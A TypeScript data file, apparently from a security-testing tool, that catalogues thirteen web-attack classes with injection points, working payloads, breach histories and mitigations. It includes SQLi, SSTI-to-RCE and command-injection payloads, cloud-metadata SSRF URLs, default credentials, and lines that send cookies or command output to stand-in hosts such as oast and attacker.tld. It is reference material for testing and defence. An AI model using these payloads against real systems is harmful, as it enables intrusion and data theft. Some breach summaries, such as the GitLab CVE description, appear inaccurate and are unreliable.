export interface PayloadExample {
  payload: string;
  explain: string;
}

export interface FamousCase {
  title: string;
  detail: string;
}

export interface CategoryInfo {
  label: string;
  description: string;
  inject_at: string[];
  examples: PayloadExample[];
  famous: FamousCase[];
  mitigation: string;
}

export const CATEGORY_INFO: Record<string, CategoryInfo> = {
  sqli: {
    label: 'SQL Injection',
    description: 'Tricks a SQL backend into executing attacker-controlled query fragments. Confirms reads, writes, auth-bypass, and full DB exfil in modern stacks that still concatenate strings into queries.',
    inject_at: ['URL query params (?id=)', 'POST form body', 'JSON body fields', 'HTTP headers (X-Forwarded-For, Referer)', 'Cookie values', 'GraphQL variables'],
    examples: [
      { payload: "' OR '1'='1'-- ", explain: 'Classic auth bypass — login form, comments out the rest of the query.' },
      { payload: "' UNION SELECT NULL,version(),database()-- ", explain: 'UNION-based exfil. Increase NULLs until column count matches.' },
      { payload: "' AND SLEEP(5)-- ", explain: 'Time-based blind. Response delayed by 5s confirms injection (MySQL).' },
      { payload: '1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)', explain: 'Stacked sleep inside subquery — bypasses naive WAFs.' },
      { payload: "1' AND ExtractValue(1,concat(0x7e,(SELECT version())))-- ", explain: 'Error-based via XPath function — leaks data through SQL errors.' },
    ],
    famous: [
      { title: 'TalkTalk breach (2015)', detail: '4M customers exposed, £77M cost. Plain SQLi on a legacy URL.' },
      { title: 'Heartland Payment Systems (2008)', detail: '130M card numbers stolen. Started with SQLi on a web form.' },
      { title: '7-Eleven SQLi chain (2007–09)', detail: 'Same actors as Heartland — chained SQLi → backend pivot → $300M+ damage.' },
      { title: 'Sony Pictures (2011)', detail: 'LulzSec dumped 1M user records via SQLi on a login form.' },
    ],
    mitigation: 'Parameterised queries everywhere. ORMs do this by default — but only if you do not feed them raw strings.',
  },

  xss: {
    label: 'Cross-Site Scripting',
    description: 'Injects attacker JavaScript into a page so it runs in the victim`s browser session. Leads to cookie theft, account takeover, keylogging, and browser-based attacks via BeEF or custom hooks.',
    inject_at: ['Search query params reflected in HTML', 'User profile fields', 'Comment / forum bodies', 'File names (Stored XSS)', 'window.name', 'PostMessage payloads', 'JSON props rendered with dangerouslySetInnerHTML'],
    examples: [
      { payload: '<script>alert(document.domain)</script>', explain: 'Sanity check — confirms unescaped reflection.' },
      { payload: '"><svg onload=alert(1)>', explain: 'Breaks out of an attribute (e.g. value="…"), works when <script> is blocked.' },
      { payload: 'javascript:fetch(`https://oast/?c=${document.cookie}`)', explain: 'href / src injection — open redirect → XSS chain.' },
      { payload: "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", explain: 'Base64-wrapped payload to bypass naive content filters.' },
      { payload: '<iframe srcdoc="<script>parent.postMessage(document.cookie,`*`)</script>">', explain: 'Stored XSS that uses postMessage to exfil cross-origin.' },
    ],
    famous: [
      { title: 'MySpace Samy worm (2005)', detail: 'Stored XSS infected 1M profiles in 20 hours. Author got a felony conviction.' },
      { title: 'Twitter `onMouseOver` (2010)', detail: 'Tweet text reflected unescaped — moving the mouse triggered retweets.' },
      { title: 'British Airways (2018)', detail: '380k card details stolen via Magecart XSS injected into checkout JS.' },
      { title: 'eBay stored XSS (2014)', detail: 'Persistent script in listing pages redirected buyers to phishing.' },
    ],
    mitigation: 'Output encoding at the right context (HTML body vs attribute vs JS). CSP with `script-src` nonces. Framework escape-by-default (React JSX, Vue templates).',
  },

  cmdi: {
    label: 'OS Command Injection',
    description: 'Smuggles shell commands through a parameter that ends up in system(), exec(), backticks, or similar. The most direct path to RCE on a misconfigured app.',
    inject_at: ['File-handling params (filename, log)', 'Ping / traceroute style features', 'Image / PDF processing (ImageMagick, Ghostscript)', 'Backup endpoints', 'Diagnostic / debug routes'],
    examples: [
      { payload: '; id', explain: 'Trivial probe on Linux — confirms shell interpretation.' },
      { payload: '| whoami', explain: 'Pipe variant — works when ; is filtered.' },
      { payload: '`curl https://oast/$(whoami)`', explain: 'Blind RCE confirmation via OAST DNS — no output channel needed.' },
      { payload: '$(nslookup attacker.oast)', explain: 'Subshell with DNS exfil. Works inside double-quoted strings.' },
      { payload: '||powershell -e <base64>', explain: 'Windows variant — encoded PowerShell to dodge AV.' },
    ],
    famous: [
      { title: 'Shellshock (CVE-2014-6271)', detail: 'Bash function-parsing bug — injected via User-Agent into CGI scripts. Worm-able.' },
      { title: 'ImageTragick (CVE-2016-3714)', detail: 'ImageMagick parsed `https://…` SVG into shell commands.' },
      { title: 'Confluence OGNL → RCE (CVE-2021-26084)', detail: 'OGNL template injection let unauth users run shell commands on confluence.atlassian.com.' },
      { title: 'Citrix ADC (CVE-2019-19781)', detail: 'Path traversal + template injection → RCE on tens of thousands of Citrix gateways.' },
    ],
    mitigation: 'Do not shell out from user input. If you must, use execve()-style array APIs (not `system()` string), and whitelist arguments hard.',
  },

  ssti: {
    label: 'Server-Side Template Injection',
    description: 'Slips template syntax into a value that gets rendered by Jinja2, Twig, Freemarker, Velocity, ERB, etc. Often escalates to full RCE because templates can call language built-ins.',
    inject_at: ['Email subject / body templates', 'Server-rendered error pages', '`name=` style profile fields', 'Admin notification messages', 'PDF/HTML report templates'],
    examples: [
      { payload: '{{7*7}}', explain: 'Probe — returns 49 means Jinja2 / Twig / Smarty interpolation.' },
      { payload: '${7*7}', explain: 'Freemarker / Velocity / Spring EL variant.' },
      { payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", explain: 'Jinja2 → RCE chain through Python object model.' },
      { payload: '<%= system("id") %>', explain: 'ERB (Ruby) — direct shell call.' },
      { payload: '#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke(null,"id")', explain: 'Velocity → RCE via reflection.' },
    ],
    famous: [
      { title: 'Uber Jinja2 SSTI (2016)', detail: '$10k bug bounty — Flask debug page rendered user input through Jinja2 = full RCE on internal infra.' },
      { title: 'Atlassian Confluence (CVE-2022-26134)', detail: 'OGNL injection in /server-info → unauth RCE. Mass exploited.' },
      { title: 'Apple AML (2021)', detail: 'PDF generation pipeline rendered Velocity templates from user data.' },
      { title: 'Spring4Shell adjacent', detail: 'Multiple Spring apps shipped with template engines fed by user input.' },
    ],
    mitigation: 'Render templates against a fixed context. User input is data, not template code. If you must accept template snippets, sandbox the engine (e.g. Jinja2 SandboxedEnvironment).',
  },

  lfi: {
    label: 'Local File Inclusion / Path Traversal',
    description: 'Reads (or includes-as-code) arbitrary files on the server by abusing a path parameter. Often pivots to RCE via log poisoning, /proc/self/environ, or PHP wrappers.',
    inject_at: ['file=, template=, page=, lang= params', 'Document download endpoints', 'Image-serving routes', 'Theme / skin selectors', 'Plugin loaders'],
    examples: [
      { payload: '../../../../etc/passwd', explain: 'Classic Linux read probe. ../ count depends on server CWD.' },
      { payload: '..%2f..%2f..%2fetc%2fpasswd', explain: 'URL-encoded variant for naive filters.' },
      { payload: '..%252f..%252f..%252fetc%252fpasswd', explain: 'Double-URL-encoded — double-decoding bug in nginx/iis stacks.' },
      { payload: 'php://filter/convert.base64-encode/resource=index.php', explain: 'PHP wrapper — leaks source of a PHP file as base64.' },
      { payload: '....//....//....//etc/passwd', explain: 'Filter bypass — server strips a single `../`, this still leaves one.' },
    ],
    famous: [
      { title: 'Akamai bypass (2021)', detail: 'Path normalisation difference between Akamai edge and origin → arbitrary file read.' },
      { title: 'Cisco ASA path traversal (CVE-2020-3187)', detail: 'Unauth read of files including session cookies and config.' },
      { title: 'F5 BIG-IP TMUI (CVE-2020-5902)', detail: 'Traversal in TMUI plus eval call → unauth RCE.' },
      { title: 'WordPress duplicator plugin', detail: 'Multiple LFI CVEs that leaked wp-config.php — straight to admin takeover.' },
    ],
    mitigation: 'Resolve user input to a canonical path, then verify the resolved path is inside an allow-listed directory. Never concatenate user input into `include`/`require`.',
  },

  ssrf: {
    label: 'Server-Side Request Forgery',
    description: 'Makes the server fetch a URL the attacker chose — internal admin endpoints, cloud metadata services, redis/memcached, internal SaaS APIs. Often unauth RCE on cloud workloads.',
    inject_at: ['url=, callback=, webhook= params', 'PDF/HTML conversion services (wkhtmltopdf, Puppeteer)', 'Avatar / image fetchers', 'OAuth redirect_uri', 'XML <!ENTITY> (also XXE)', 'Webhook test buttons'],
    examples: [
      { payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', explain: 'AWS metadata — leaks temporary IAM creds. Worked on most AWS workloads pre-IMDSv2.' },
      { payload: 'http://metadata.google.internal/computeMetadata/v1/?recursive=true', explain: 'GCP equivalent — needs `Metadata-Flavor: Google` header.' },
      { payload: 'http://127.0.0.1:6379/', explain: 'Redis on localhost — often unauthenticated. Inject CONFIG SET dir / write keys for RCE.' },
      { payload: 'gopher://127.0.0.1:11211/_stats', explain: 'gopher:// lets you craft raw bytes to memcached / redis / SMTP / etc.' },
      { payload: 'http://[::1]/admin', explain: 'IPv6 loopback to bypass `127.0.0.1` blocklists.' },
    ],
    famous: [
      { title: 'Capital One (2019)', detail: '100M records, $80M+ fine. SSRF in a WAF hit AWS metadata → S3 read with role creds.' },
      { title: 'GitLab CI SSRF chain', detail: 'Multiple reports — SSRF to internal Sidekiq / Redis → RCE on GitLab.com.' },
      { title: 'Apple SSRF (2020)', detail: 'Sam Curry team — SSRF on iCloud worker → internal API access.' },
      { title: 'Shopify SSRF', detail: 'Image scaler fetched arbitrary URLs — used to reach internal monitoring.' },
    ],
    mitigation: 'Egress allow-list at the network layer. Strict URL parser + reject private/loopback/link-local. Use IMDSv2 on AWS. Separate VPC for outbound URL-fetcher services.',
  },

  xxe: {
    label: 'XML External Entity',
    description: 'Defines an external entity in an XML document so the parser fetches it from disk or the network. Reads files, scans internal networks, occasionally lands DoS or RCE.',
    inject_at: ['SOAP endpoints', 'SAML AuthnRequest / Response', 'Office docs (DOCX/XLSX uploads)', 'SVG uploads', 'Webhook payloads accepting XML', 'OAuth XML configs'],
    examples: [
      { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', explain: 'Classic file read via local entity.' },
      { payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://oast/?d=file:///etc/passwd">]>', explain: 'Out-of-band XXE — blind variant exfiltrates via DNS/HTTP.' },
      { payload: '<!ENTITY % p SYSTEM "http://attacker.tld/evil.dtd">%p;', explain: 'Parameter entity loads an external DTD for nested OOB tricks.' },
      { payload: '<!ENTITY xxe SYSTEM "expect://id">', explain: 'PHP expect:// wrapper — direct command execution where enabled.' },
    ],
    famous: [
      { title: 'Facebook OpenID XXE (2014)', detail: 'Reginaldo Silva — $33k. Read /etc/passwd, escalated toward RCE.' },
      { title: 'Google XML parser XXE (2014)', detail: 'Multiple XXE in Google services — internal network discovery.' },
      { title: 'Uber SAML XXE (2018)', detail: 'Auth gateway parsed SAML with external entities enabled.' },
      { title: 'Apple Pages XXE (2018)', detail: 'Document parser fetched URLs from inside .pages files.' },
    ],
    mitigation: 'Disable DTD processing entirely (libxml2 LIBXML_NONET / LIBXML_NOENT off). Use a JSON API instead if you control both ends.',
  },

  ldap: {
    label: 'LDAP Injection',
    description: 'Manipulates LDAP search filters — usually on corporate login pages or AD-backed apps. Auth bypass, account enumeration, and full directory exfil.',
    inject_at: ['Login forms backed by LDAP/AD', 'User search features', 'Group membership queries', 'Admin "find user" tools'],
    examples: [
      { payload: '*)(uid=*))(|(uid=*', explain: 'Breaks out of `(uid=$input)` filter — returns all users.' },
      { payload: 'admin)(&)', explain: 'Auth bypass — `(&)` is an always-true filter on most LDAP servers.' },
      { payload: 'admin*', explain: 'Wildcard — enumerates accounts starting with `admin`.' },
      { payload: 'admin)(|(mail=*))', explain: 'Blind LDAPi — boolean test of an attribute.' },
    ],
    famous: [
      { title: 'Many enterprise SaaS reports', detail: 'LDAPi against on-prem AD auth bridges shows up regularly in bug bounty programs (Slack/HR/SSO portals).' },
      { title: 'OWASP top reference cases', detail: 'Search Joomla/WordPress LDAP plugin advisories — classic CVEs.' },
    ],
    mitigation: 'Escape with the LDAP standard escape sequences (RFC 4515). Better: use a parameterised LDAP client API.',
  },

  nosql: {
    label: 'NoSQL Injection',
    description: 'MongoDB and friends parse query operators ($eq, $ne, $gt, $where, $regex) inside JSON request bodies. Insert operators where the app expected a string and you can re-shape the query.',
    inject_at: ['JSON login bodies', 'Search endpoints', 'Filter / facet queries', 'Mongoose / Sequelize-backed CRUD'],
    examples: [
      { payload: '{"username":"admin","password":{"$ne":null}}', explain: 'Auth bypass — `$ne:null` matches any non-null password.' },
      { payload: '{"username":{"$regex":"^admin"},"password":{"$regex":".*"}}', explain: 'Account enumeration via regex matching.' },
      { payload: '{"$where":"this.password.length > 10"}', explain: 'Server-side JS predicate — blind boolean attack.' },
      { payload: '{"username":{"$gt":""}}', explain: 'Lexically-greater-than match — same trick as $ne.' },
    ],
    famous: [
      { title: 'Rocket.Chat (CVE-2021-22911)', detail: 'NoSQLi in password reset → account takeover for any user.' },
      { title: 'MongoDB-backed admin panels', detail: 'Recurring HackerOne pattern — Express + Mongoose without input validation.' },
    ],
    mitigation: 'Coerce input types before passing to the driver. Schema validation (zod, joi). Avoid `$where` and Server-Side JS execution entirely.',
  },

  open_redirect: {
    label: 'Open Redirect',
    description: 'Looks low-severity alone but chains with OAuth, phishing, and SSO to land account takeover. The site sends the victim to an attacker URL it considers trustworthy.',
    inject_at: ['login `?next=` / `?redirect=` params', 'logout flows', 'OAuth redirect_uri', 'Email tracking links', '404 fallback URLs'],
    examples: [
      { payload: '//evil.com/', explain: 'Browser interprets // as scheme-relative — server-side string checks see no scheme.' },
      { payload: 'https:evil.com', explain: 'Missing slashes — some parsers accept this, browsers honour it.' },
      { payload: 'https://target.com.evil.com/', explain: 'Subdomain confusion — passes a `startsWith("https://target.com")` check.' },
      { payload: 'javascript:alert(document.domain)', explain: 'Redirect into a JS URI = stored XSS via redirect.' },
    ],
    famous: [
      { title: 'Google OAuth + open redirect chains', detail: 'Multiple bounty writeups — open redirect chained with the `code` flow → account takeover.' },
      { title: 'Microsoft / Office365 chains', detail: 'Phishing campaigns that pivot through legitimate Office redirect URLs to bypass mail filters.' },
    ],
    mitigation: 'Allow-list of full URLs (or at least full hostnames). Reject scheme-relative `//`, javascript:, data: outright.',
  },

  auth: {
    label: 'Default & Weak Credentials',
    description: 'Combolists, default vendor credentials, and rockyou-style wordlists. Surprisingly often the path of least resistance against admin panels, IoT, and forgotten staging environments.',
    inject_at: ['Login forms', 'Admin panels', 'Router / printer / camera web UIs', 'Database web consoles (phpMyAdmin, Adminer)', 'JIRA / Confluence / Jenkins'],
    examples: [
      { payload: 'admin / admin', explain: 'Test it. Routers, NAS, JIRA test instances — still works.' },
      { payload: 'root / toor', explain: 'Kali default. Surprisingly common in homelab leaks.' },
      { payload: 'jboss / jboss', explain: 'JBoss / Wildfly default — pre-2010 deploys.' },
      { payload: 'tomcat / s3cret', explain: 'Tomcat manager default in many CTFs (because real).' },
    ],
    famous: [
      { title: 'Mirai botnet (2016)', detail: 'Took down DynDNS and most of US east-coast internet. Brute-forced 60+ default IoT creds.' },
      { title: 'Verkada cameras (2021)', detail: 'Hard-coded super-admin credential leaked → 150k cameras compromised.' },
      { title: 'Various Jenkins exposures', detail: 'Default `anonymous` permissions on internet-exposed Jenkins → RCE via Script Console.' },
    ],
    mitigation: 'Force password change on first login. Reject top-1000 passwords at signup. Network-isolate admin UIs.',
  },

  fuzzing: {
    label: 'General Fuzzing',
    description: 'High-entropy or boundary-case payloads to surface crashes, off-by-ones, integer overflows, regex DoS, and unexpected error responses that hint at deeper bugs.',
    inject_at: ['Anywhere — but yields most from binary protocols, parsers, regex-driven validators, file upload endpoints, and HTTP header parsers.'],
    examples: [
      { payload: '%n%n%n%n%n', explain: 'C printf format strings — reaches deep into legacy CGI / embedded systems.' },
      { payload: 'A'.repeat(65536), explain: 'Length-boundary probe — overflow buffers, hit reflection limits, find 414 URI Too Long edge cases.' },
      { payload: '../../../%00.jpg', explain: 'Null-byte path traversal — old PHP / Java still vulnerable to ASCIIZ truncation.' },
      { payload: '(?:(?:(?:(?:(?:.+)?)?)?)?)?', explain: 'ReDoS — catastrophic backtracking against naive regex validators.' },
    ],
    famous: [
      { title: 'Shellshock environment fuzz', detail: 'Discovered by feeding `() { :;};` through every HTTP header.' },
      { title: 'Heartbleed (CVE-2014-0160)', detail: 'Bounded-length fuzzing of OpenSSL TLS heartbeat handler.' },
      { title: 'Image parser CVEs', detail: 'Pixar, libpng, libjpeg, ImageMagick — fuzzed by Project Zero into oblivion.' },
    ],
    mitigation: 'Defensive parsers (Rust, Zig, properly-bounded C). Run AFL/libFuzzer on your own parsers in CI.',
  },

  traversal: {
    label: 'Path Traversal',
    description: 'Dedicated traversal wordlist — overlaps with LFI, but kept separate for fuzzing endpoints that serve files (downloads, exports, static handlers) rather than execute them.',
    inject_at: ['Download endpoints', 'File preview features', 'Backup download buttons', 'Archive (zip/tar) viewers', 'Static asset handlers'],
    examples: [
      { payload: '../../../../../../etc/shadow', explain: 'Higher-privilege variant — only readable when the app runs as root (bad config).' },
      { payload: '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', explain: 'Windows traversal — backslash, plus IIS treats it differently than Apache.' },
      { payload: '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd', explain: 'UTF-8 overlong encoding — old IIS / mod_security bypass.' },
      { payload: '/var/log/apache2/access.log', explain: 'Log poisoning prep — write payload into User-Agent, then include the log.' },
    ],
    famous: [
      { title: 'Microsoft IIS Unicode (CVE-2000-0884)', detail: 'Foundational traversal CVE — still appears in textbooks.' },
      { title: 'GitLab path traversal (CVE-2023-7028)', detail: 'Recent CVE — password reset emails sent to attacker via traversal trick.' },
    ],
    mitigation: 'Resolve to canonical path, then enforce an allow-list prefix. Reject `..` and percent-encoded variants outright.',
  },
};
